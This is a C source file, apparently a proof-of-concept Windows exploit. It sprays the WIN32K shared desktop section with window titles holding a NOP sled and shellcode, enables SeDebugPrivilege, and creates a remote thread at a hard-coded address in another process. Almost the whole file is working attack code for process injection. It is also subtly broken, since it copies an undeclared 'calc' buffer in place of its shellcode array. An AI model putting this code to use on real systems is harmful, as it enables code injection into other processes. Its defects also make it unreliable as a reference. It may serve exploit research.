#include<Windows.h>
#include<stdio.h>

// based on http://j00ru.vexillium.org/?p=893

/*
One thing that the two processes (exploit and UTILMAN) have in common,
is the desktop these two programs operate on. 
It turns out that WIN32K.SYS – the main graphical kernel module on Windows – manages two shared sections (a per-session and a per-desktop one), 
mapped in the context of every GUI process (a process becomes graphical after issuing a call to one of the WIN32K system calls).
One of these sections contains the characteristics of windows present on the considered desktop,
including arrays of data (e.g. unicode windows titles, editbox values and more). Consequently,
a malicious application is able to store arbitrary bytes in the memory context of a highly-privileged process in the system,
just by manipulating or creating basic windows on the local desktop.

*/

const WCHAR g_szClassName[] = L"ClassSpary";


LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch(msg)
	{
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

int WINAPI SparyMemory()
{
	WNDCLASSEX wc;
	HWND hwnd;
	MSG Msg;

	wc.cbSize        = sizeof(WNDCLASSEX);
	wc.style         = 0;
	wc.lpfnWndProc   = WndProc;
	wc.cbClsExtra    = 0;
	wc.cbWndExtra    = 0;
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
	wc.lpszMenuName  = NULL;
	wc.lpszClassName = g_szClassName;
	wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);

	if(!RegisterClassEx(&wc))
	{
		MessageBoxW(NULL, L"Window Registration Failed!", L"Error!",
			MB_ICONEXCLAMATION | MB_OK);
		return 0;
	}

	/* shellcode -> nop-nop-nop-MessageBox-nop-nop*/


char Messagebox[] = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
           "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
           "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
               "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
           "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
           "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
                   "\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
           "\x49\x0b\x31\xc0\x51\x50\xff\xd7";

	WCHAR ShellCode[4096*3];


	memset(ShellCode,'\x90',sizeof(WCHAR)*4096*3);
	memcpy((char*)ShellCode+sizeof(WCHAR)*4096*2,calc,strlen(calc));

	for( int i=0;i<1000;i++)
	{
		hwnd = CreateWindowExW(
			WS_EX_CLIENTEDGE,
			g_szClassName,
			ShellCode,
			WS_OVERLAPPEDWINDOW,
			CW_USEDEFAULT, CW_USEDEFAULT, 240, 120,
			NULL, NULL, NULL, NULL);
		}

}

BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
    ) 
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if ( !LookupPrivilegeValue( 
            NULL,            // lookup privilege on local system
            lpszPrivilege,   // privilege to lookup 
            &luid ) )        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError() ); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if ( !AdjustTokenPrivileges(
           hToken, 
           FALSE, 
           &tp, 
           sizeof(TOKEN_PRIVILEGES), 
           (PTOKEN_PRIVILEGES) NULL, 
           (PDWORD) NULL) )
    { 
          printf("AdjustTokenPrivileges error: %u\n", GetLastError() ); 
          return FALSE; 
    } 

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
          printf("The token does not have the specified privilege. \n");
          return FALSE;
    } 

    return TRUE;
}


int LoadPrivilege(void){
	HANDLE hToken;
	LUID Value;
	TOKEN_PRIVILEGES tp;
	if( !OpenProcessToken( GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
		return( GetLastError() );
	if( !LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &Value ) )
		return( GetLastError() );
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = Value;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if( !AdjustTokenPrivileges( hToken, FALSE,&tp, sizeof( tp ), NULL, NULL ) )
		return( GetLastError() );
	CloseHandle( hToken );
	return 1;
}

void main()
{

	LoadPrivilege(); 

	SparyMemory();

	//showWin32kUserHandleTable();

	int  CalcProcessId=2600;
	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,CalcProcessId);
      if(processHandle == NULL)
	  {
		  printf("processHandle error %d \r\n",GetLastError());
		  return ;
	  }

	  HANDLE  threadHandle = CreateRemoteThread(processHandle,NULL,0,(LPTHREAD_START_ROUTINE)0x00806060,NULL,NULL,0);
	   if(threadHandle == NULL)
	  {
		  printf("threadHandle error %d \r\n",GetLastError());
		  return ;
	  }

	CloseHandle(processHandle);
	printf("press key to end");
	getchar();

}
